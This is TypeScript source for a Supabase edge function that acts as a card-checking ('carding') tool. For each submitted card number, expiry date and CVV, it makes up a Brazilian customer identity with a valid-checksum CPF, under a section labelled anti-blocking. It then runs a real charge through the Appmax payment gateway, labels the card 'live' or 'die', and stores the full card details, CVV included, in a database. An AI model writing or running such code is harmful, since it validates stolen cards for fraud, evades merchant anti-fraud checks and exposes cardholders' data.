import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TestCardRequest {
    sessionId: string;
    cardNumber: string;
    expMonth: string;
    expYear: string;
    cvv: string;
    gatewayUrl?: string;
    processingOrder: number;
    amount?: number;
    proxyUrl?: string;
}

// ========================================
// GERAÇÃO DE DADOS (Anti-Bloqueio)
// ========================================

function generateCPF(): string {
    const randomDigit = () => Math.floor(Math.random() * 10);
    const cpf = Array.from({ length: 9 }, randomDigit);
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += cpf[i] * (10 - i);
    let remainder = sum % 11;
    const digit1 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit1);
    sum = 0;
    for (let i = 0; i < 10; i++) sum += cpf[i] * (11 - i);
    remainder = sum % 11;
    const digit2 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit2);
    return cpf.join('');
}

const firstNames = ['João', 'Maria', 'José', 'Ana', 'Pedro', 'Juliana', 'Carlos', 'Fernanda', 'Paulo', 'Mariana', 'Lucas', 'Beatriz', 'Rafael', 'Camila', 'Felipe', 'Amanda'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Costa', 'Ferreira', 'Rodrigues', 'Almeida', 'Nascimento', 'Pereira', 'Carvalho'];
const products = ['Ebook Marketing Digital', 'Curso Online', 'Mentoria VIP', 'Acesso Premium', 'Pacote de Templates', 'Consultoria Express'];

function generateCustomerData() {
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const randomNum = Math.floor(Math.random() * 9000) + 1000;

    return {
        firstname: firstName,
        lastname: lastName,
        email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}@gmail.com`,
        telephone: `119${Math.floor(10000000 + Math.random() * 90000000)}`,
        document_number: generateCPF(),
        address: {
            street: 'Rua das Flores',
            number: Math.floor(Math.random() * 999) + 1,
            district: 'Centro',
            city: 'São Paulo',
            state: 'SP',
            zipcode: '01001-000'
        }
    };
}

// ========================================
// APPMAX API CLIENT
// ========================================

async function appmaxRequest(endpoint: string, method: string, body: any, token: string) {
    const url = `${Deno.env.get('APPMAX_API_URL') || 'https://api.appmax.com.br/api/v3'}${endpoint}`;

    console.log(`📡 Appmax Request: ${method} ${endpoint}`);

    const response = await fetch(url, {
        method,
        headers: {
            'Content-Type': 'application/json',
            'access-token': token
        },
        body: JSON.stringify(body)
    });

    const data = await response.json();

    if (!response.ok) {
        console.error(`❌ Appmax Error [${endpoint}]:`, JSON.stringify(data));
        throw new Error(data.message || `Appmax API Error: ${response.status}`);
    }

    return data;
}

// ========================================
// FLUXO DE VENDA
// ========================================

async function processAppmaxSale(cardData: TestCardRequest, token: string) {
    const customerData = generateCustomerData();
    const productName = products[Math.floor(Math.random() * products.length)];
    const amount = cardData.amount || 1.00;

    // 1. CRIAR CLIENTE
    console.log('👤 Creating Customer...');
    const customerPayload = {
        firstname: customerData.firstname,
        lastname: customerData.lastname,
        email: customerData.email,
        telephone: customerData.telephone,
        cpf: customerData.document_number,
        address_street: customerData.address.street,
        address_number: customerData.address.number,
        address_district: customerData.address.district,
        address_city: customerData.address.city,
        address_state: customerData.address.state,
        address_zipcode: customerData.address.zipcode,
    };

    const customerRes = await appmaxRequest('/customer', 'POST', customerPayload, token);
    const customerId = customerRes.data?.id;

    if (!customerId) throw new Error('Failed to create customer');
    console.log(`✅ Customer Created: ${customerId}`);

    // 2. CRIAR PEDIDO
    console.log('📦 Creating Order...');
    const orderPayload = {
        customer_id: customerId,
        products: [{
            name: productName,
            qty: 1,
            price: amount
        }],
        total: amount
    };

    const orderRes = await appmaxRequest('/order', 'POST', orderPayload, token);
    const orderId = orderRes.data?.id;

    if (!orderId) throw new Error('Failed to create order');
    console.log(`✅ Order Created: ${orderId}`);

    // 3. PROCESSAR PAGAMENTO
    console.log('💳 Processing Payment...');
    const paymentPayload = {
        order_id: orderId,
        payment: {
            CreditCard: {
                number: cardData.cardNumber,
                cvv: cardData.cvv,
                month: cardData.expMonth,
                year: cardData.expYear,
                installments: 1,
                name: `${customerData.firstname} ${customerData.lastname}`.toUpperCase()
            }
        }
    };

    const paymentRes = await appmaxRequest('/payment/credit-card', 'POST', paymentPayload, token);

    return {
        success: true,
        status: paymentRes.data?.status === 'approved' ? 'live' : 'die', // Simplificado, ajustar conforme retorno real
        message: paymentRes.message || 'Transaction processed',
        raw: paymentRes
    };
}

// ========================================
// MAIN HANDLER
// ========================================

serve(async (req) => {
    if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders });

    try {
        const supabaseClient = createClient(
            Deno.env.get('SUPABASE_URL') ?? '',
            Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
        );

        const requestData: TestCardRequest = await req.json();
        const { sessionId, cardNumber, expMonth, expYear, cvv, processingOrder, amount } = requestData;

        if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv) {
            return new Response(JSON.stringify({ error: 'Missing fields' }), { status: 400, headers: corsHeaders });
        }

        const token = Deno.env.get('APPMAX_ACCESS_TOKEN');
        if (!token) throw new Error('APPMAX_ACCESS_TOKEN not configured');

        const startTime = Date.now();
        let result;

        try {
            // Executa fluxo completo
            const saleResult = await processAppmaxSale(requestData, token);

            // Analisa retorno
            // O Appmax retorna status variados, precisamos mapear
            // Exemplo hipotético de mapeamento
            const statusMap: any = {
                'approved': 'live',
                'authorized': 'live',
                'paid': 'live',
                'refused': 'die',
                'refunded': 'die',
                'charged_back': 'die',
                'pending': 'unknown'
            };

            // Tenta extrair status real do payload de resposta
            // Ajuste conforme a resposta real da API de pagamento
            const apiStatus = saleResult.raw.data?.status?.toLowerCase() || 'unknown';
            const finalStatus = statusMap[apiStatus] || 'die';

            result = {
                status: finalStatus,
                message: saleResult.message,
                amount: amount,
                responseTimeMs: Date.now() - startTime
            };

        } catch (err: any) {
            console.error('❌ Payment Process Error:', err.message);

            // Tenta identificar se foi recusa de cartão ou erro de sistema
            const errorMsg = err.message.toLowerCase();
            let status = 'unknown';

            if (errorMsg.includes('authorized') || errorMsg.includes('approved')) status = 'live';
            else if (errorMsg.includes('refused') || errorMsg.includes('declined') || errorMsg.includes('não autorizado')) status = 'die';

            result = {
                status: status as 'live' | 'die' | 'unknown',
                message: err.message,
                amount: amount,
                responseTimeMs: Date.now() - startTime
            };
        }

        // Salva resultado
        await supabaseClient.from('card_test_results').insert([{
            session_id: sessionId,
            card_number: cardNumber,
            exp_month: expMonth,
            exp_year: expYear,
            cvv: cvv,
            gateway_url: 'APPMAX_API_V3',
            processing_order: processingOrder,
            status: result.status,
            message: result.message,
            amount: result.amount,
            response_time_ms: result.responseTimeMs
        }]);

        return new Response(
            JSON.stringify({ success: true, testResult: result }),
            { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );

    } catch (error: any) {
        console.error('💥 Critical Error:', error);
        return new Response(
            JSON.stringify({ error: error.message }),
            { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
    }
});
